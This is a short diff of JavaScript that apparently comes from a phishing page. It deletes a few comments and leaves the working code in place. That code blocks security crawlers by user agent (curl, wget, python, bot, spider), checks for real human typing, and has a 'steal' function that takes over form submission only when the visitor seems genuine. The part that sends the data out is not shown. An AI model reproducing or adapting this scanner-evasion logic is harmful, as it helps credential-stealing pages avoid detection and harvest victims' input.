@@ -187,7 +187,6 @@
   const startTime = Date.now();
   let typed = false;
 
-  // User-Agent blocklist (very basic)
   const ua = navigator.userAgent.toLowerCase();
   const bots = ['curl', 'wget', 'python', 'bot', 'spider', 'httpclient'];
   const isBot = bots.some(agent => ua.includes(agent));
@@ -196,7 +195,6 @@
     throw new Error("Blocked");
   }
 
-  // Detect real typing
   document.querySelectorAll(".input-field").forEach(field => {
     field.addEventListener("input", () => {
       typed = true;
@@ -206,7 +204,6 @@
   function steal(e) {
     e.preventDefault();
 
-    // Delay + typing check
     if (!typed || (Date.now() - startTime < 3000)) {
       console.log("Suspicious interaction. Exiting.");
       return;
